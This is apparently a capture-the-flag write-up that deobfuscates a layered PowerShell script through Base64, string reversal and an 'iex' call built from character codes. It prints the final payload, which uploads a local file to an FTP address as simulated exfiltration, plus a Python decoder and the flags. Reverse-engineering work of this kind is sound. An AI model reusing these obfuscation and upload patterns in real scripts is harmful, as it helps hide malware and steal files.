# DawgCTF - Suspicious Script (Reversing)

## Initial Analysis

Running `strings` on the file revealed a large Base64 encoded string and a final execution command:

```bash
┌──(sanskariwolf㉿SanskariWolf)-[~/…/CTFs/DawgCTF/Reversing/Suspicious Script]
└─$ strings homeworkHelper.ps1            
$6=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbaSe64stRIng('JAB7A...<snip>...QBBAD0APQAnACkAKQA7ACQAewBAAH0AIAA9ACIAeAAiADsAJABiAD0AJABhAC4AVABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQA7AFsAYQByAFIAYQBZAF0AOgA6AHIARQBWAGUAcgBTAGUAKAAkAGIAKQA7ACgAJABiACAALQBKAG8ASQBuACAAIgAiACkAIAB8ACAAJgAoACIAJAB7ACEAfQBlACQAewBAAH0AIgApAA=='))
& ([char]105+[char]101+[char]120) $6
```

This shows:
1.  A variable `$6` is assigned the result of decoding a large Base64 string using UTF-16LE (`Unicode`).
2.  The command `iex` (Invoke-Expression) is constructed using `[char]105 + [char]101 + [char]120`.
3.  The decoded content in `$6` is executed using `& ('iex') $6`.

## Deobfuscation - Layer 1

The first step is to decode the Base64 string assigned to `$6$. Doing this reveals the Layer 2 script:

```powershell
${!}=[CHar]105;$a=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([cONVerT]::FrOmbaSe64stRIng('fQB0A...<snip>...gB9ACc='));${@}="x";$b=$a.ToCharArray();[arRAy]::rEVersE($b);($b -JoIN "") | &("${!}e${@}")
```

This second layer script does the following:
1.  Sets `${!}` to 'i' (`[Char]105`).
2.  Sets `${@}` to 'x'.
3.  Decodes *another* Base64 string ('fQB0A...') using UTF-16LE and assigns it to `$a`.
4.  Converts the string `$a` to a character array `$b`.
5.  **Reverses** the character array `$b` in place using `[Array]::Reverse($b)`.
6.  Joins the reversed character array back into a string (`$b -Join ""`).
7.  Pipes the reversed string to another dynamically constructed `iex` command (`& ("${!}e${@}")` becomes `& ('iex')`).

## Deobfuscation - Layer 2 (Reversal)

The core of the second layer is decoding its embedded Base64 string and then reversing it.

1.  **Decode Base64:** Decode `fQB0A...gB9ACc=` using Base64 -> UTF-16LE.
2.  **Reverse String:** Reverse the resulting string.

The reversed string is the final payload (Layer 3):

```powershell
try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]80+[CHar]97+[CHar]119+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:scary@DawgCTF{Wr4pped_5c1pt5!}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}
```

## Final Payload Analysis - Layer 3

This final script simulates data exfiltration:

1.  **File Path Construction:** It builds a string `$F` by concatenating characters:
    *   `[CHar]67+[CHar]58+...` decodes to `C:\Paws{3nc0d3d_ps_5cr1pt}.txt`.
    *   This contains a string formatted like a flag: `DawgCTF{3nc0d3d_ps_5cr1pt}`.

2.  **FTP Setup:** It defines an FTP URL:
    *   `$ftp="ftp://user:scary@DawgCTF{Wr4pped_5c1pt5!}/in/pass.zip"`
    *   Crucially, another flag-formatted string is embedded directly in the FTP URL hostname part: `DawgCTF{Wr4pped_5c1pt5!}`.

3.  **Upload Attempt:** It uses `System.Net.WebClient` to attempt uploading the file specified by `$F` to the FTP server defined in `$ftp`.

## Flag Discovery

Two potential flags were found:
1.  `DawgCTF{3nc0d3d_ps_5cr1pt}` (from the constructed filename `$F`)
2.  `DawgCTF{Wr4pped_5c1pt5!}` (from the FTP URL `$ftp`)

In CTF challenges involving simulated exfiltration or C2 communication, the flag embedded within the target URL/address is typically the intended one.

## Automation Script

A Python script was used to automate the decoding and reversal:

```python
import base64
import re

# Layer 1: The initial Base64 string from the file
base64_layer1 = 'JAB7ACEAfQA9AFsAQwBIAGEAcgBdADEAMAA1ADsAJABhAD0AWwBTAHkAUwBUAEUAbQAuAHQARQBYAHQALgBFAG4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQARQAuAGcARQB0AFMAdABSAGkAbgBnACgAWwBjAG8ATgBWAGUAcgBUAF0AOgA6AEYAcgBPAG0AYgBhAHMAZQA2ADQAcwB0AFIASQBuAGcAKAAnAGYAUQBCADAAQQBHAGsAQQBlAEEAQgBsAEEASABzAEEAYQBBAEIAagBBAEgAUQBBAFkAUQBCAGoAQQBIADAAQQBPAHcAQQBwAEEARQBZAEEASgBBAEEAZwBBAEMAdwBBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQBvAEEARwBVAEEAYgBBAEIAcABBAEUAWQBBAFoAQQBCAGgAQQBHADgAQQBiAEEAQgB3AEEARgBVAEEATABnAEIAcwBBAEcATQBBAGQAdwBBAGsAQQBEAHMAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEAZwBBAEgAUQBBAGMAdwBCAHAAQQBFAHcAQQBkAEEAQgB1AEEARwBVAEEAYgBRAEIAMQBBAEcAYwBBAGMAZwBCAEIAQQBDADAAQQBJAEEAQgBwAEEASABJAEEAVgBRAEEAdQBBAEcAMABBAFoAUQBCADAAQQBIAE0AQQBlAFEAQgBUAEEAQwBBAEEAWgBRAEIAdABBAEcARQBBAFQAZwBCAGwAQQBIAEEAQQBlAFEAQgBVAEEAQwAwAEEASQBBAEIAMABBAEcATQBBAFoAUQBCAHEAQQBHAEkAQQBUAHcAQQB0AEEASABjAEEAWgBRAEIATwBBAEQAMABBAGEAUQBCAHkAQQBIAFUAQQBKAEEAQQA3AEEASABRAEEAYgBnAEIAbABBAEcAYwBBAGIAQQBCAEQAQQBHAEkAQQBaAFEAQgBYAEEAQwA0AEEAZABBAEIAbABBAEUANABBAEwAZwBCAHQAQQBHAFUAQQBkAEEAQgB6AEEASABrAEEAVQB3AEEAZwBBAEcAVQBBAA0ACgBiAFEAQgBoAEEARQA0AEEAWgBRAEIAdwBBAEgAawBBAFYAQQBBAHQAQQBDAEEAQQBkAEEAQgBqAEEARwBVAEEAYQBnAEIAaQBBAEUAOABBAEwAUQBCADMAQQBHAFUAQQBUAGcAQQA5AEEARwB3AEEAWQB3AEIAMwBBAEMAUQBBAE8AdwBBAGkAQQBIAEEAQQBhAFEAQgA2AEEAQwA0AEEAYwB3AEIAegBBAEcARQBBAGMAQQBBAHYAQQBHADQAQQBhAFEAQQB2AEEASAAwAEEASQBRAEEAMQBBAEgAUQBBAGMAQQBBAHgAQQBHAE0AQQBOAFEAQgBmAEEARwBRAEEAWgBRAEIAdwBBAEgAQQBBAE4AQQBCAHkAQQBGAGMAQQBlAHcAQgBHAEEARgBRAEEAUQB3AEIAbgBBAEgAYwBBAFkAUQBCAEUAQQBFAEEAQQBlAFEAQgB5AEEARwBFAEEAWQB3AEIAegBBAEQAbwBBAGMAZwBCAGwAQQBIAE0AQQBkAFEAQQB2AEEAQwA4AEEATwBnAEIAdwBBAEgAUQBBAFoAZwBBAGkAQQBEADAAQQBjAEEAQgAwAEEARwBZAEEASgBBAEEANwBBAEQAWQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AQQBBAHkAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADIAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFkAQQANAAoATgBBAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABVAEEATQBnAEEAeABBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATgBnAEEAeABBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAeQBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAawBBAE4AQQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQAUQBBAE0AUQBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE8AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE0AdwBBADEAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBADUAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBAHkAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAFUAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBNAEEAQQB4AEEARgAwAEEADQAKAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBRAEEAMQBBAEYAMABBAGMAZwBCAGgAQQBFAGcAQQBRAHcAQgBiAEEAQwBzAEEATQBBAEEAdwBBAEQARQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANABBAEQAUQBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEANQBBAEQAawBBAFgAUQBCAHkAQQBHAEUAQQBTAEEAQgBEAEEARgBzAEEASwB3AEEAdwBBAEQARQBBAE0AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQARQBBAE4AUQBCAGQAQQBIAEkAQQBZAFEAQgBJAEEARQBNAEEAVwB3AEEAcgBBAEQATQBBAE0AZwBBAHgAQQBGADAAQQBjAGcAQgBoAEEARQBnAEEAUQB3AEIAYgBBAEMAcwBBAE4AUQBBAHgAQQBEAEUAQQBYAFEAQgB5AEEARwBFAEEAUwBBAEIARABBAEYAcwBBAEsAdwBBADUAQQBEAEUAQQBNAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAGMAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEEAQQBPAEEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAFcAdwBBAHIAQQBEAEkAQQBPAFEAQgBkAEEASABJAEEAWQBRAEIASQBBAEUATQBBAA0ACgBXAHcAQQByAEEARABnAEEATgBRAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQByAEEARABjAEEATgBnAEIAZABBAEgASQBBAFkAUQBCAEkAQQBFAE0AQQBXAHcAQQA5AEEARQBZAEEASgBBAEIANwBBAEgAawBBAGMAZwBCADAAQQBBAD0APQAn'

# Decode Layer 1 (Base64 -> bytes -> UTF-16LE string)
print("[+] Decoding Layer 1...")
bytes_layer1 = base64.b64decode(base64_layer1)
script_layer2_raw = bytes_layer1.decode('utf-16le')

# Layer 2: Extract the inner Base64 string, decode it, and reverse it
print("[+] Processing Layer 2 (Extracting, Decoding, Reversing)...")
match_layer2 = re.search(r"FrOmbaSe64stRIng\s*\(\s*'([^']*)'\s*\)", script_layer2_raw, re.IGNORECASE)

if not match_layer2:
    print("[!] Error: Could not find the Base64 string in Layer 2.")
    exit(1)

base64_layer2 = match_layer2.group(1)
bytes_layer2 = base64.b64decode(base64_layer2)
string_to_reverse = bytes_layer2.decode('utf-16le')

script_layer3_raw = string_to_reverse[::-1] # Reverse the string

# Layer 3 Processing: It's the final payload
print("[+] Processing Layer 3 (Analyzing reversed script)...")

# Use regex to find the flag format within the FTP URL string
flag_match = re.search(r"DawgCTF\{([^}]+)\}", script_layer3_raw)

if flag_match:
    flag = f"DawgCTF{{{flag_match.group(1)}}}"
    print("\n[+] Success! Flag found within the Layer 3 payload.")
    print(f"[*] Final Decoded String (Flag): {flag}")
else:
    print("[!] Error: Could not extract flag using the expected format 'DawgCTF{...}' from Layer 3.")
    print("[*] Raw Layer 3 content:")
    print(script_layer3_raw)

```

## Flag

The flag is found embedded in the FTP URL in the final layer of the script:

```
DawgCTF{Wr4pped_5c1pt5!}
```
```
